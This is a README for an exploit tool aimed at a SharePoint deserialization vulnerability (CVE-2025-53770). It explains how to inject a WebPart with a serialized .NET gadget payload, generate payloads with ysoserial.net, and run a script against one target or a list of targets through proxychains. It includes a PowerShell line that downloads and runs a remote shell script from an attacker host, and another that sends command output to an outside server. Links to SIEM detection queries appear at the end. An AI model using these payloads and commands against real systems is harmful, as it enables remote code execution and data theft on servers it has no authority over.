# SharePoint WebPart Injection Exploit Tool


| Field               | Value                                                                 |
|--------------------|-----------------------------------------------------------------------|
| **Component**       | Microsoft SharePoint (on-premises)                                    |
| **Endpoint**        | `/layouts/15/ToolPane.aspx`                                           |
| **Parameter**       | `MSOTlPn_DWP`                                                         |
| **Injected Control**| `<Scorecard:ExcelDataSet CompressedDataTable="...">`                 |
| **Vulnerability**   | Insecure deserialization (`BinaryFormatter`, `LosFormatter`, etc.)    |
| **CVE**             | [CVE-2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770)     |
| **NOTICE**          | [MSRC](https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/)  |
---

## How It Works

<p align="center">
  <img src="exploit-flow.png" />
</p>

1. Authenticated users can send POST requests to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit`.

2. The request includes the parameter `MSOTlPn_DWP`, containing an injected **WebPart XML**.

3. Inside the WebPart, the attacker places a `<Scorecard:ExcelDataSet>` component with the `CompressedDataTable` attribute holding a payload:
- Serialized .NET object
- Encoded in Base64
- Compressed using GZIP

4. SharePoint automatically **inflates** and **deserializes** the object using unsafe formatters.

5. If the object contains a valid **gadget chain** (e.g., `ObjectDataProvider`), **arbitrary code** is executed on the server.

## Requirements

- Python 3.x
- Required Python modules:
```bash
pip install -r requirements.txt
```

* A Base64 GZIP-compressed .NET deserialization payload (see next section)

The payload must be:

* A `.NET DataSet` or similar gadget chain
* Serialized using `LosFormatter` or `BinaryFormatter`
* Base64-encoded
* GZIP-compressed
* Embedded inside this WebPart structure:

```xml
<asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="upTest">
  <ProgressTemplate>
    <div class="divWaiting">
      <Scorecard:ExcelDataSet CompressedDataTable="{PAYLOAD}" DataTable-CaseSensitive="false" runat="server" />
    </div>
  </ProgressTemplate>
</asp:UpdateProgress>
```

---

## Generating Payloads (Using `ysoserial.net`)

### Generate the base64 serialized object

```bash
cd ysoserial.net

# compile from source or use Dockerfile

ysoserial.exe -f LosFormatter -g ObjectDataProvider -o base64 -c "calc.exe" > payload.b64
```

> You can replace `calc.exe` with any command — for example, a reverse shell.

---

## Generating Payloads with `YSLosf`

### Step 1: Create Payload File

Put your command (e.g., reverse shell) into `payload.txt`:

```powershell
powershell -nop -c iwr http://attacker/shell.ps1 | iex
```

### Step 2: Generate Base64 Payload

```bash
C:\Users\darkarmy\Desktop\YSLosf\bin\x64\Debug\net48>.\YSLosf.exe --p payload.txt
Serialized string:
/wEFBWZsdG1j

Base64 encoded:
L3dFRkJXWnNkRzFq

C:\Users\darkarmy\Desktop\YSLosf\bin\x64\Debug\net48>.\YSLosf.exe -d dpayload.txt
Deserialized object:
fltmc
```

---

### Compress with GZIP

```python
# compress.py
import gzip, base64

with open("base64.txt", "rb") as f:
    b64 = base64.b64decode(f.read())
    gz = gzip.compress(b64)
    # print(base64.b64encode(gz).decode())
    encoded = base64.b64encode(gz).decode()

with open("payload-final.txt", "w") as out_file:
    out_file.write(encoded)
```

> Save the final output into `payload.txt` — this is what you give to the exploit script.

---

## Compatible Gadget Chains

You can use any gadget chain supported by your serialization tool. Common examples include:

* `System.Data.DataSet`
* `System.Data.Services.Internal.ExpandedWrapper`
* `System.Web.UI.LosFormatter`
* `System.Windows.Data.ObjectDataProvider`

> For more, check [ysoserial.net](https://github.com/pwntester/ysoserial.net)

---

## Output / Echo

This vulnerability **does not return command output** like `ipconfig` in the HTTP response. If you want output:

* Use reverse shell payloads
* Or redirect output via `Invoke-WebRequest`:

```powershell
powershell -c "ipconfig | Invoke-WebRequest -Uri http://your-ip:8118/?d=$(Get-Content -Raw)"
```


## Example Usage

```bash
podman build -t toolshell .

podman run -it --name toolshell \
  --cap-add=net_admin \
  --device /dev/net/tun \
  -v /etc/resolv.conf:/etc/resolv.conf:ro \
  -p 127.0.0.1:8118:8118 -p 127.0.0.1:9050:9050 -p 127.0.0.1:9051:9051 \
  -d toolshell

podman exec -it toolshell /bin/bash

# single target
proxychains python3 CVE-2025-53770.py -u https://target -p payload.txt

# multiple targets
proxychains python3 CVE-2025-53770.py -f targets.txt -p payload.txt --proxy http://127.0.0.1:8118
```

### Arguments:

| Argument      | Description                                        |
|---------------|----------------------------------------------------|
| `-u`          | Target URL (e.g., `https://sp.company.local`)      |
| `-f`          | File containing target URLs (one per line)         |
| `-p`          | Payload file or direct Base64 GZIP string          |
| `--proxy`     | Optional proxy (e.g., `http://127.0.0.1:8080`)     |
| `-t`          | Timeout in seconds (default: 15)                   |

## SIEM Detection Queries:

| Field               | Value                                                                 |
|---------------------|-----------------------------------------------------------------------|
| **Elastic**         | [EQL](https://github.com/robert-iw3/threat-hunting/blob/main/elastic-security/CVE-2025-53770.md) |
| **Splunk**          | [SPL](https://github.com/robert-iw3/threat-hunting/blob/main/splunk/CVE-2025-53770.md)           |
| **SentinelOne**     | [S1QL](https://github.com/robert-iw3/threat-hunting/blob/main/sentinel_one/spinstall0.aspx.md)   |
| **Sigma**           | [PostExploit](https://github.com/robert-iw3/threat-hunting/blob/main/sigma/2025/sharepoint_postexploit.yaml) |
| **Sigma**           | [Webshell](https://github.com/robert-iw3/threat-hunting/blob/main/sigma/2025/sharepoint_webshell.yaml)    |
| **MS Sentinel**     | [CVE-2025-53770](https://github.com/robert-iw3/threat-hunting/blob/main/kql/Sentinel/SharePoint%20Vulnerability%20Exploitation%20Attempt%20(CVE-2025-49704%2C%20CVE-2025-49706%2C%20CVE-2025-53770).kql)     |
| **NOTICE**          | [MSRC](https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/)  |
---